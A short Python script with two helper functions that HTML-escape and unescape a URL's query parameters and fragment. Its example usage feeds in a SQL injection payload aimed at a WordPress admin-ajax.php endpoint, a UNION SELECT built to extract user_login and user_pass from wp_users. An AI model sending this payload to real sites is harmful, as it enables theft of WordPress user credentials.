import urllib.parse
import html

def html_encode_url(url):
    """Encodes the query parameters & fragment of a URL while preserving the scheme, domain, and path."""
    
    # Parse the URL components
    parsed_url = urllib.parse.urlparse(url)
    
    # Preserve the scheme, netloc, and path
    scheme_netloc_path = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    
    # Encode query parameters
    encoded_query = urllib.parse.urlencode({
        key: html.escape(value) for key, value in urllib.parse.parse_qsl(parsed_url.query)
    })
    
    # Encode fragment (if exists)
    encoded_fragment = html.escape(parsed_url.fragment) if parsed_url.fragment else ""
    
    # Construct final URL
    final_url = scheme_netloc_path
    if encoded_query:
        final_url += f"?{encoded_query}"
    if encoded_fragment:
        final_url += f"#{encoded_fragment}"
    
    return final_url

def html_decode_url(url):
    """Decodes the query parameters & fragment of a URL back to their original form."""
    
    # Parse the URL components
    parsed_url = urllib.parse.urlparse(url)
    
    # Preserve the scheme, netloc, and path
    scheme_netloc_path = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    
    # Decode query parameters
    decoded_query = urllib.parse.urlencode({
        key: html.unescape(value) for key, value in urllib.parse.parse_qsl(parsed_url.query)
    })
    
    # Decode fragment (if exists)
    decoded_fragment = html.unescape(parsed_url.fragment) if parsed_url.fragment else ""
    
    # Construct final URL
    final_url = scheme_netloc_path
    if decoded_query:
        final_url += f"?{decoded_query}"
    if decoded_fragment:
        final_url += f"#{decoded_fragment}"
    
    return final_url

# Example Usage
if __name__ == "__main__":
    original_url = "https://example.com/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"
    
    encoded_url = html_encode_url(original_url)
    decoded_url = html_decode_url(encoded_url)
    
    print("🔵 Original URL:")
    print(original_url)
    print("\n🟢 HTML Encoded URL:")
    print(encoded_url)
    print("\n🔴 HTML Decoded URL:")
    print(decoded_url)
